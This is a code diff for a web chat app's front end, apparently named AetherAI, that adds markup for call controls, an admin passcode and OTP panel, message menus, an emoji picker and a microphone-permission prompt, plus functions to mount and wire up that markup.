+              <path d="M6 13c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1zm0 4c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1zm0-8c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1zm-3 6.5c-.28 0-.5.22-.5.5s.22.5.5.5.5-.22.5-.5-.22-.5-.5-.5zM6 5c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1zM3 10.5c-.28 0-.5.22-.5.5s.22.5.5.5.5-.22.5-.5-.22-.5-.5-.5zm6 5.5c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1zm7.5-5.5c-.28 0-.5.22-.5.5s.22.5.5.5.5-.22.5-.5-.22-.5-.5-.5zM15 5c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1zm0 8c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1zm-3-3.5c-.83 0-1.5.67-1.5 1.5s.67 1.5 1.5 1.5 1.5-.67 1.5-1.5-.67-1.5-1.5-1.5zM21 10.5c-.28 0-.5.22-.5.5s.22.5.5.5.5-.22.5-.5-.22-.5-.5-.5zm-3 1.5c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1zm0-4c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1zm0 8c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1zm-3-7c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1zm0 8c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"/>
+            </svg>
+          </span>
+          <span class="more-menu-label">Blur Background</span>
+        </button>
+
+        <div class="more-menu-divider"></div>
+        <button type="button" class="more-menu-item" id="close-more-menu-btn" style="justify-content:center;">
+          <span class="more-menu-label" style="color:rgba(255,255,255,0.5)">Close</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- Merge Call Panel -->
+    <div id="merge-call-panel" class="merge-call-panel hidden">
+      <div class="merge-call-card">
+        <div class="merge-card-header">
+          <span class="merge-icon">ðŸ‘¥</span>
+          <h3>Add to Call</h3>
+          <button type="button" id="close-merge-panel-btn" class="close-keypad-btn">&times;</button>
+        </div>
+        <p class="merge-card-desc">Select a contact to merge into this call and start a group conference.</p>
+        <div id="merge-contacts-list" class="merge-contacts-list">
+          <p class="merge-empty-state">No other users online to add.</p>
+        </div>
+        <div class="merge-card-footer">
+          <button type="button" id="cancel-merge-btn" class="btn-cancel-merge">Cancel</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+  <!-- Audio elementsts for calling states -->
+  <audio id="dialing-sound" src="https://assets.mixkit.co/active_storage/sfx/2049/2049-84.wav" loop preload="none"></audio>
+  <audio id="ringtone-sound" src="https://assets.mixkit.co/active_storage/sfx/1359/1359-84.wav" loop preload="none"></audio>
+
+  <!-- Soft audio notifications for chat (preload disabled to boost initial page speed) -->
+  <audio id="notification-sound" src="https://assets.mixkit.co/active_storage/sfx/2357/2357-84.wav" preload="none"></audio>
+
+  <!-- 3. ADMIN PORTAL MODAL -->
+  <div id="admin-portal-modal" class="admin-portal-modal hidden">
+    <div class="admin-card">
+      <button type="button" id="admin-close-btn" class="admin-close-btn">&times;</button>
+      
+      <div class="admin-header-title">
+        <svg viewBox="0 0 24 24" width="26" height="26" fill="currentColor" style="color: var(--accent-color);">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.47 10 10 10 10-4.47 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
+        </svg>
+        <h2>AetherAI Admin Panel</h2>
+      </div>
+
+      <div class="admin-section">
+        <label class="admin-sec-label">Current Configuration</label>
+        <div class="admin-status-box">
+          <div>🔑 Current Passcode: <strong id="admin-current-passcode-txt">Loading...</strong></div>
+          <div>✉️ OTP Protection: <strong id="admin-otp-status-txt">Loading...</strong></div>
+        </div>
+      </div>
+
+      <!-- Settings Form -->
+      <div id="admin-settings-form">
+        <div class="admin-field">
+          <label for="admin-new-passcode" class="admin-field-label">New Messenger Passcode</label>
+          <input type="text" id="admin-new-passcode" placeholder="Enter new passcode..." autocomplete="off">
+        </div>
+
+        <!-- OTP is permanently required, toggle checkbox removed -->
+
+        <button type="button" id="admin-save-btn" class="btn-primary" style="margin-top: 10px;">
+          Save Settings
+        </button>
+      </div>
+
+      <!-- OTP Verification Panel (Hidden by default) -->
+      <div id="admin-otp-verification-panel" class="hidden">
+        <div class="admin-field">
+          <p class="admin-otp-msg">A security OTP was sent to the admin email. Please enter it below to confirm changes:</p>
+          <input type="text" id="admin-otp-input" placeholder="Enter 6-digit OTP..." autocomplete="off" maxlength="6">
+        </div>
+        <button type="button" id="admin-verify-btn" class="btn-primary" style="margin-top: 10px;">
+          Confirm OTP & Update
+        </button>
+      </div>
+
+      <div id="admin-portal-message" class="admin-portal-message"></div>
+    </div>
+  </div>
+
+  <!-- Context Menu -->
+  <div id="msg-context-menu" class="msg-context-menu hidden">
+    <button type="button" class="ctx-item" id="ctx-reply"><svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M10 9V5l-7 7 7 7v-4.1c5 0 8.5 1.8 11 5.1-1-5-4-10-11-11z"/></svg> Reply</button>
+    <button type="button" class="ctx-item ctx-edit hidden" id="ctx-edit"><svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg> Edit</button>
+    <button type="button" class="ctx-item" id="ctx-copy"><svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg> Copy</button>
+    <button type="button" class="ctx-item" id="ctx-forward"><svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M14 9V5l7 7-7 7v-4.1c-5 0-8.5 1.8-11 5.1 1-5 4-10 11-11z"/></svg> Forward</button>
+    <button type="button" class="ctx-item" id="ctx-pin"><svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M16 12V4h1V2H7v2h1v8l-2 2v2h5.2v6h1.6v-6H18v-2l-2-2z"/></svg> Pin</button>
+    <button type="button" class="ctx-item ctx-delete hidden" id="ctx-delete" style="color:#ff3b30;"><svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg> Delete</button>
+  </div>
+
+  <!-- Forward Modal -->
+  <div id="forward-modal" class="modal-overlay hidden">
+    <div class="forward-modal-card">
+      <div class="forward-modal-header">
+        <h3>Forward Message</h3>
+        <button type="button" id="forward-modal-close" class="admin-close-btn" style="position:static;">✕</button>
+      </div>
+      <p style="font-size:0.8rem;color:var(--text-muted);margin:0 0 12px;">Select a room to forward to:</p>
+      <div id="forward-rooms-list" class="forward-rooms-list"></div>
+    </div>
+  </div>
+
+  <!-- Full Emoji Picker -->
+  <div id="emoji-picker-panel" class="emoji-picker-panel hidden">
+    <div class="emoji-picker-tabs">
+      <button class="emoji-tab active" data-cat="recent" title="Recent">🕐</button>
+      <button class="emoji-tab" data-cat="smileys" title="Smileys">😀</button>
+      <button class="emoji-tab" data-cat="people" title="People">👋</button>
+      <button class="emoji-tab" data-cat="nature" title="Nature">🌿</button>
+      <button class="emoji-tab" data-cat="food" title="Food">🍕</button>
+      <button class="emoji-tab" data-cat="travel" title="Travel">✈️</button>
+      <button class="emoji-tab" data-cat="objects" title="Objects">💡</button>
+      <button class="emoji-tab" data-cat="symbols" title="Symbols">❤️</button>
+    </div>
+    <div id="emoji-grid" class="emoji-grid"></div>
+  <!-- Microphone Permission Detection & Request Modal -->
+  <div id="mic-permission-modal" class="modal-overlay hidden" style="z-index: 9999;">
+    <div class="mic-perm-card">
+      <div class="mic-perm-header">
+        <div class="mic-perm-icon-wrapper">
+          <svg viewBox="0 0 24 24" width="32" height="32" fill="currentColor">
+            <path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.34 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/>
+          </svg>
+        </div>
+        <button type="button" id="close-mic-perm-btn" class="admin-close-btn" style="position: static;">✕</button>
+      </div>
+      <h3>Microphone Access Required</h3>
+      <p id="mic-perm-desc">Microphone access was denied or blocked by your browser. Tap below to detect & allow microphone access for real-time voice call.</p>
+
+      <div class="mic-perm-actions" style="margin-bottom: 12px;">
+        <button type="button" id="grant-mic-perm-btn" class="btn-primary" style="background: var(--accent-color); font-weight: 600; padding: 12px 18px; width: 100%; border-radius: 12px; font-size: 0.95rem; display: flex; align-items: center; justify-content: center; gap: 8px;">
+          🎙️ Grant Microphone Access
+        </button>
+      </div>
+
+      <div id="mic-perm-instructions" class="mic-perm-instructions">
+        💡 <strong>How to unblock in your browser:</strong>
+        <ol>
+          <li>Tap the 🔒 <strong>Lock</strong> icon or <strong>Settings</strong> icon in your browser address bar.</li>
+          <li>Select <strong>Site Settings</strong> or <strong>Permissions</strong>.</li>
+          <li>Set <strong>Microphone</strong> to <strong>Allow</strong>.</li>
+        </ol>
+      </div>
+    </div>
+  </div>`;
+let isMessengerDOMMounted = false;
+
+function mountMessengerDOM() {
+  if (isMessengerDOMMounted) return;
+  const tempDiv = document.createElement('div');
+  tempDiv.innerHTML = MESSENGER_MARKUP;
+  while (tempDiv.firstChild) {
+    document.body.appendChild(tempDiv.firstChild);
+  }
+  isMessengerDOMMounted = true;
+  initDynamicDOMReferences();
+}
+
+function initDynamicDOMReferences() {
+  // Re-query all DOM elements after dynamic injection
+  loginContainer = document.getElementById('login-container');
+  loginForm = document.getElementById('login-form');
+  usernameInput = document.getElementById('username');
+  roomSelect = document.getElementById('room-select');
+  appContainer = document.getElementById('app-container');
+
+  sidebar = document.getElementById('sidebar');
+  searchChatInput = document.getElementById('search-input');
+  roomsList = document.getElementById('rooms-list');
+  onlineUsersList = document.getElementById('online-users');
+  userCountBadge = document.getElementById('user-count');
+
+  currentUserAvatar = document.getElementById('current-user-avatar');
+  currentUserName = document.getElementById('current-user-name');
+
+  themeToggleBtn = document.getElementById('theme-toggle');
+  themeIconSvg = document.getElementById('theme-icon-svg');
+
+  activeRoomTitle = document.getElementById('active-room-title');
+  roomMembersCount = document.getElementById('room-members-count');
+  connectionIndicator = document.getElementById('connection-indicator');
+
+  messagesContainer = document.getElementById('messages-container');
+  messageForm = document.getElementById('message-form');
+  messageInput = document.getElementById('message-input');
+  sendBtn = document.getElementById('send-btn');
+  micRecordBtn = document.getElementById('mic-record-btn');
+
+  emojiBtn = document.getElementById('emoji-btn');
+  emojiPickerPanel = document.getElementById('emoji-picker-panel');
+  emojiGrid = document.getElementById('emoji-grid');
+  attachBtn = document.getElementById('attach-btn');
+  fileInput = document.getElementById('file-input');
+
+  uploadProgressContainer = document.getElementById('upload-progress-container');
+  uploadFilename = document.getElementById('upload-filename');
+  uploadProgressBar = document.getElementById('upload-progress-bar');
+  cancelUploadBtn = document.getElementById('cancel-upload-btn');
+
+  voiceRecordPanel = document.getElementById('voice-record-panel');
+  voiceRecordTimer = document.getElementById('voice-record-timer');
+  voiceCancelBtn = document.getElementById('voice-cancel-btn');
+  voiceSendBtn = document.getElementById('voice-send-btn');
+
+  replyPreviewBar = document.getElementById('reply-preview-bar');
+  replyPreviewName = document.getElementById('reply-preview-name');
+  replyPreviewText = document.getElementById('reply-preview-text');
+  cancelReplyBtn = document.getElementById('cancel-reply-btn');
+
+  editModeBar = document.getElementById('edit-mode-bar');
+  editPreviewText = document.getElementById('edit-preview-text');
+  cancelEditBtn = document.getElementById('cancel-edit-btn');
+
+  scrollToBottomBtn = document.getElementById('scroll-to-bottom-btn');
+  scrollUnreadBadge = document.getElementById('scroll-unread-badge');
+  mobileBackBtn = document.getElementById('mobile-back-btn');
+
+  incomingCallOverlay = document.getElementById('incoming-call-overlay');
+  incomingCallerAvatar = document.getElementById('incoming-caller-avatar');
+  incomingCallerName = document.getElementById('incoming-caller-name');
+  incomingCallTypeLabel = document.getElementById('incoming-call-type-label');
+  acceptCallBtn = document.getElementById('accept-call-btn');
+  declineCallBtn = document.getElementById('decline-call-btn');
+
+  activeCallOverlay = document.getElementById('active-call-overlay');
+  remoteAudio = document.getElementById('remote-audio');
+  remoteVideo = document.getElementById('remote-video');
+  localVideo = document.getElementById('local-video');
+  videoStreamsContainer = document.getElementById('video-streams-container');
+  iosCallContainer = document.getElementById('ios-call-container');
+
+  activeCallAvatar = document.getElementById('active-call-avatar');
+  activeCallPeerName = document.getElementById('active-call-peer-name');
+  activeCallStatus = document.getElementById('active-call-status');
+  callTimerDisp = document.getElementById('call-timer');
+
+  iosAudioBtn = document.getElementById('ios-audio-btn');
+  iosFacetimeBtn = document.getElementById('ios-facetime-btn');
+  iosFacetimeLabel = document.getElementById('ios-facetime-label');
+  iosMuteBtn = document.getElementById('ios-mute-btn');
+  iosMuteIcon = document.getElementById('ios-mute-icon');
+  iosMuteLabel = document.getElementById('ios-mute-label');
+  iosMoreBtn = document.getElementById('ios-more-btn');
+  iosEndBtn = document.getElementById('ios-end-btn');
+
+  bindDynamicMessengerListeners();
+}
+
+function bindDynamicMessengerListeners() {
+  if (loginForm) loginForm.addEventListener('submit', handleLogin);
+  if (logoutBtn) logoutBtn.addEventListener('click', handleLogout);
+  if (messageForm) messageForm.addEventListener('submit', handleSendMessage);
+  if (messageInput) messageInput.addEventListener('input', handleTypingInput);
+
+  if (themeToggleBtn) {
+    themeToggleBtn.addEventListener('click', () => {
+      isDarkTheme = !isDarkTheme;
+      localStorage.setItem('theme', isDarkTheme ? 'dark' : 'light');
+      applyTheme(isDarkTheme);
+    });
+  }
+
+  if (acceptCallBtn) acceptCallBtn.addEventListener('click', acceptIncomingCall);
+  if (declineCallBtn) declineCallBtn.addEventListener('click', declineIncomingCall);
+  if (iosMuteBtn) iosMuteBtn.addEventListener('click', toggleLocalMicrophone);
+  if (iosFacetimeBtn) iosFacetimeBtn.addEventListener('click', toggleLocalVideo);
+  if (iosEndBtn) iosEndBtn.addEventListener('click', stopUserCall);
+  if (iosAudioBtn) iosAudioBtn.addEventListener('click', toggleAudioOutputDevice);
+}
+
 let currentUsername = '';
 let currentRoom = 'AetherAIFree General';
 let typingTimeout = null;
@@ -291,6 +1096,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // Verify stored session unlock status
   if (sessionStorage.getItem('gate_unlocked') === 'true') {
+    mountMessengerDOM();
     if (securityMaskGate) securityMaskGate.classList.add('hidden');
     if (loginContainer) loginContainer.classList.remove('hidden');
     
@@ -458,6 +1264,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const data = await response.json();
         if (data.success) {
           sessionStorage.setItem('gate_unlocked', 'true');
+mountMessengerDOM();
           agentMsgDiv.textContent = '🔓 Gateway unlocked. Initializing connection interface.';
           setTimeout(() => {
             if (securityMaskGate) {
